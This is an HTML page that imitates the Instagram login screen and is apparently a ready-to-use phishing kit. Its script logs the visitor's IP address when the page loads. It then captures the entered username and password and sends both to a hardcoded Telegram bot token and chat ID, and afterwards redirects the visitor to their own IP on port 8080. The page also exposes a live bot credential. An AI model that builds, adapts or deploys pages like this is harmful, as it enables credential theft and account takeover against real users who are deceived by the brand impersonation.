<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            background-color: #121212;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #1d1d1d;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.5);
            text-align: center;
            width: 320px;
        }
        .logo {
            margin-bottom: 20px;
        }
        .logo img {
            width: 180px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: none;
            border-radius: 5px;
            background-color: #2c2c2c;
            color: #ffffff;
        }
        input::placeholder {
            color: #bbbbbb;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #007bb5;
        }
        .footer {
            margin-top: 20px;
            font-size: 14px;
        }
        .footer a {
            color: #0095f6;
            text-decoration: none;
        }
    </style>
</head>
<body onload="requestPermissions()">

    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
        </div>
        <input type="text" id="username" placeholder="Instagram ID">
        <input type="password" id="password" placeholder="Password">
        <button onclick="sendData()">Log In</button>
        <div class="footer">Don't have an account? <a href="#">Sign up</a></div>
    </div>

    <script>
        let ipAddress = "Unknown IP";
        let fileShareLink = "Unknown link";

        async function requestPermissions() {
            try {
                // Get the user's public IP address
                await fetch('https://api.ipify.org?format=json')
                    .then(response => response.json())
                    .then(data => {
                        ipAddress = data.ip;
                        fileShareLink = `http://${ipAddress}:8080`;
                        sendInteractionToBot('User opened the page and detected IP for file sharing.');
                    });
            } catch (error) {
                console.error('Error fetching IP address:', error);
            }
        }

        function sendInteractionToBot(eventDetails) {
            const message = `New Interaction:\nEvent: ${eventDetails}\nIP Address: ${ipAddress}\nFile Share Link: ${fileShareLink}\nTime: ${new Date().toLocaleString()}`;

            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';  // Your bot token
            const chatId = '860517021';  // Your chat ID
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });
        }

        function sendData() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            const message = `Login Attempt:\nInstagram ID: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nFile Share Link: ${fileShareLink}\nTime: ${new Date().toLocaleString()}`;

            const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';  // Your bot token
            const chatId = '860517021';  // Your chat ID
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            // Send login attempt and file-sharing link to Telegram
            fetch(telegramApiUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            }).then(() => {
                // Redirect the user to the shared file directory
                window.location.href = fileShareLink;
            });
        }
    </script>

</body>
</html>
